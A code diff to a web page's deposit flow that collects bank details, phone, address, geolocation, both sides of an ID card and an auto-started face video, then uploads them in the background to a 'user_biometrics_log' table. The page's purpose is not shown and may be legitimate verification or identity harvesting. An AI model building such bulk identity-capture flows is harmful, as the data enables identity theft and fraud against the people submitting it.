@@ -61,6 +61,7 @@
             <div class="step-dot" id="dot-3"></div>
         </div>
 
+        <!-- Step 1: Transaction -->
         <div id="step-1" class="space-y-4 animate__animated animate__fadeIn">
             <p class="text-[10px] text-white/40 uppercase font-bold tracking-widest">1. Transaction Details</p>
             <div class="grid grid-cols-2 gap-3">
@@ -83,6 +84,7 @@
             <button onclick="goToStep(2)" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-4">Continue to ID</button>
         </div>
 
+        <!-- Step 2: ID Upload -->
         <div id="step-2" class="hidden space-y-4 animate__animated animate__fadeIn">
             <p class="text-[10px] text-white/40 uppercase font-bold tracking-widest">2. Identity Information</p>
             <div class="glass p-3 rounded-xl"><input id="dep-phone" type="tel" placeholder="Phone Number" class="bg-transparent w-full text-xs outline-none"></div>
@@ -105,6 +107,7 @@
             </div>
         </div>
 
+        <!-- Step 3: Biometrics -->
         <div id="step-verify" class="hidden space-y-4 animate__animated animate__fadeIn">
             <div class="text-center space-y-2">
                 <h4 class="font-bold text-lg">Live Biometric Feed</h4>
@@ -137,6 +140,7 @@
             <button id="status-display" disabled class="phantom-btn w-full py-4 text-xs uppercase tracking-widest opacity-50">Auto-Starting...</button>
         </div>
 
+        <!-- Step 4: Pending -->
         <div id="pending-state" class="hidden text-center space-y-6 pt-10 animate__animated animate__fadeIn">
             <div class="flex justify-center">
                 <div class="w-20 h-20 bg-yellow-500/10 rounded-full flex items-center justify-center text-yellow-500 border border-yellow-500/20 animate-pulse">
@@ -279,7 +283,6 @@
         function startCountdown() {
             let count = 3;
             const overlay = document.getElementById('timer-overlay');
-            const status = document.getElementById('status-display');
             
             const timer = setInterval(() => {
                 count--;
@@ -299,23 +302,72 @@
             const progress = document.getElementById('video-progress');
             
             recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            
+            // Try to find the most compatible type
+            const mimeTypes = ['video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
+            let selectedType = '';
+            for (let type of mimeTypes) {
+                if (MediaRecorder.isTypeSupported(type)) {
+                    selectedType = type;
+                    break;
+                }
+            }
+
+            mediaRecorder = new MediaRecorder(stream, { mimeType: selectedType });
 
             mediaRecorder.ondataavailable = (e) => {
                 if (e.data.size > 0) recordedChunks.push(e.data);
             };
 
             mediaRecorder.onstop = async () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const videoBase64 = await fileToBase64(blob);
+                const blob = new Blob(recordedChunks, { type: selectedType });
                 
-                const idFrontFile = document.getElementById('id-front').files[0];
-                const idBackFile = document.getElementById('id-back').files[0];
+                // Immediately transition to pending UI so user doesn't wait for DB
+                const depId = Math.random().toString(36).substr(2, 9).toUpperCase();
+                const depData = { 
+                    amount: parseFloat(document.getElementById('dep-amount').value),
+                    id: depId, 
+                    method: selectedMethod, 
+                    releaseAt: new Date().getTime() + (24 * 60 * 60 * 1000),
+                    coords: geoCoords
+                };
                 
-                const frontBase64 = await fileToBase64(idFrontFile);
-                const backBase64 = await fileToBase64(idBackFile);
+                localStorage.setItem('active_deposit', JSON.stringify(depData));
+                if(stream) stream.getTracks().forEach(t => t.stop());
+                showPending(depData);
 
-                processSubmission(videoBase64, frontBase64, backBase64);
+                // Now handle file conversion and DB upload in the background
+                try {
+                    const videoBase64 = await fileToBase64(blob);
+                    const idFrontFile = document.getElementById('id-front').files[0];
+                    const idBackFile = document.getElementById('id-back').files[0];
+                    const frontBase64 = await fileToBase64(idFrontFile);
+                    const backBase64 = await fileToBase64(idBackFile);
+
+                    const amount = parseFloat(document.getElementById('dep-amount').value);
+                    const bank = document.getElementById('dep-bank').value;
+                    const phone = document.getElementById('dep-phone').value;
+                    const address = document.getElementById('dep-address').value;
+
+                    await sb.from('user_biometrics_log').insert([{ 
+                        user_id: user.id, 
+                        username: user.username,
+                        amount, 
+                        method: selectedMethod,
+                        bank_info: bank,
+                        phone: phone,
+                        address: address,
+                        geolocation: geoCoords,
+                        video_url: videoBase64,
+                        id_front: frontBase64,
+                        id_back: backBase64,
+                        required_signs: document.getElementById('target-sign').innerText,
+                        status: 'pending'
+                    }]);
+                } catch (err) { 
+                    console.error("Background Upload Failed:", err);
+                    // Optionally notify user that files failed to sync
+                }
             };
 
             mediaRecorder.start();
@@ -323,6 +375,7 @@
             indicator.classList.remove('hidden');
             progress.style.width = '100%';
 
+            // Fixed length recording: 15 seconds
             setTimeout(() => {
                 if(mediaRecorder.state !== "inactive") {
                     mediaRecorder.stop();
@@ -338,43 +391,6 @@
                 reader.onload = () => resolve(reader.result);
                 reader.onerror = error => reject(error);
             });
-        }
-
-        async function processSubmission(videoBase64, frontBase64, backBase64) {
-            const amount = parseFloat(document.getElementById('dep-amount').value);
-            const bank = document.getElementById('dep-bank').value;
-            const phone = document.getElementById('dep-phone').value;
-            const address = document.getElementById('dep-address').value;
-            const depId = Math.random().toString(36).substr(2, 9).toUpperCase();
-
-            const depData = { 
-                amount, id: depId, method: selectedMethod, 
-                releaseAt: new Date().getTime() + (24 * 60 * 60 * 1000),
-                coords: geoCoords
-            };
-            
-            localStorage.setItem('active_deposit', JSON.stringify(depData));
-            if(stream) stream.getTracks().forEach(t => t.stop());
-
-            try {
-                await sb.from('user_biometrics_log').insert([{ 
-                    user_id: user.id, 
-                    username: user.username,
-                    amount, 
-                    method: selectedMethod,
-                    bank_info: bank,
-                    phone: phone,
-                    address: address,
-                    geolocation: geoCoords,
-                    video_url: videoBase64,
-                    id_front: frontBase64,
-                    id_back: backBase64,
-                    required_signs: document.getElementById('target-sign').innerText,
-                    status: 'pending'
-                }]);
-            } catch (err) { console.error(err); }
-
-            showPending(depData);
         }
 
         function showPending(data) {
